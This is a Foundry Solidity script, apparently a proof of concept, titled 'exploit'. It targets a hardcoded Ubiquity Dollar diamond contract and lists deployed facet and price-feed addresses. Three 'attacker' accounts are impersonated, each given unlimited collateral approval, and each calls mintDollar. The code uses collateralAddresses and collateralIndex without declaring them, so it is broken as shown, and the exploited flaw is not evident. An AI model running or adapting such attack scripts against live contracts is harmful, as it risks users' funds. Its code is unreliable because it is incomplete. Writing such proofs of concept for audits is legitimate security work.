import {Script} from "forge-std/Script.sol";
import "forge-std/console.sol";
import {IERC20} from "@openzeppelin/contracts/interfaces/IERC20.sol";

//   Diamond:  0x06786bCbc114bbfa670E30A1AC35dFd1310Be82f
//   DollarToken:  0x82Bd83ec6D4bCC8EaB6F6cF7565efE1e41D92Ce5
//   ProxyDollarToken:  0x82Bd83ec6D4bCC8EaB6F6cF7565efE1e41D92Ce5
//   AccessControlFacet:  0xe519389F8c262d4301Fd2830196FB7D0021daf59
//   DiamondCutFacet:  0xcE7e5946C14Cdd1f8de4473dB9c20fd65EBd47d0
//   DiamondLoupeFacet:  0xA496E0071780CF57cd699cb1D5Ac0CdCD6cCD673
//   ManagerFacet:  0x4E76FbE44fa5Dae076a7f4f676250e7941421fbA
//   OwnershipFacet:  0x00B0517de6b2b09aBD3a7B69d66D85eFdb2c7d94
//   UbiquityPoolFacet:  0x49AeF2C4005Bf572665b09014A563B5b9E46Df21
//   ChainLinkPriceFeedETH:  0xa138575a030a2F4977D19Cc900781E7BE3fD2bc0
//   ChainLinkPriceFeedLUSD:  0xD61210E756f7D71Cc4F74abF0747D65Ea9d7525b
//   CurveStableDollarPlainPool:  0x7aB5cEee0Ff304b053CE1F67d84C33F0ff407a55
//   CurveGovernanceETHPool:  0xf524930660f75CF602e909C15528d58459AB2A56
//   CollateralToken:  0xf4e55515952BdAb2aeB4010f777E802D61eB384f
//   UbiquityAlgorithmicDollarManager:  0x26Df0Ea798971A97Ae121514B32999DfDb220e1f
//   UbiquityGovernance:  0xA3b48c7b901fede641B596A4C10a4630052449A6

import {UbiquityPoolFacet} from "../../src/dollar/facets/UbiquityPoolFacet.sol";

contract exploit is Script {
    address diamond = 0x06786bCbc114bbfa670E30A1AC35dFd1310Be82f;

    UbiquityPoolFacet ubiquityPoolFacet = UbiquityPoolFacet(diamond);

    address attacker1 = vm.addr(1);
    address attacker2 = vm.addr(2);
    address attacker3 = vm.addr(3);

    function run() external {
        console.log("Attacker 1 address:", attacker1);
        console.log("Attacker 2 address:", attacker2);
        console.log("Attacker 3 address:", attacker3);

        mintDollarFromAccount(attacker1);
        mintDollarFromAccount(attacker2);
        mintDollarFromAccount(attacker3);
    }

    function mintDollarFromAccount(address account) public {
        // Impersonate the account
        vm.startPrank(account);

        // Approve the collateral token for transfer to the pool
        IERC20(collateralAddresses[0]).approve(
            address(ubiquityPoolFacet),
            type(uint256).max
        );

        // Mint Ubiquity Dollars
        uint256 dollarAmount = 1_000 ether; // Example amount of Dollars to mint
        uint256 dollarOutMin = 990 ether; // Example minimum amount of Dollars to receive (slippage protection)
        uint256 maxCollateralIn = 1_000 ether; // Example maximum amount of collateral to send (slippage protection)
        uint256 maxGovernanceIn = 100 ether; // Example maximum amount of governance tokens to send (slippage protection)
        bool isOneToOne = true; // Force providing only collateral tokens without governance tokens

        (
            uint256 totalDollarMint,
            uint256 collateralNeeded,
            uint256 governanceNeeded
        ) = ubiquityPoolFacet.mintDollar(
                collateralIndex,
                dollarAmount,
                dollarOutMin,
                maxCollateralIn,
                maxGovernanceIn,
                isOneToOne
            );

        console.log("Account:", account);
        console.log("Dollars Minted:", totalDollarMint);
        console.log("Collateral Needed:", collateralNeeded);
        console.log("Governance Needed:", governanceNeeded);

        // Stop impersonating the account
        vm.stopPrank();
    }
}
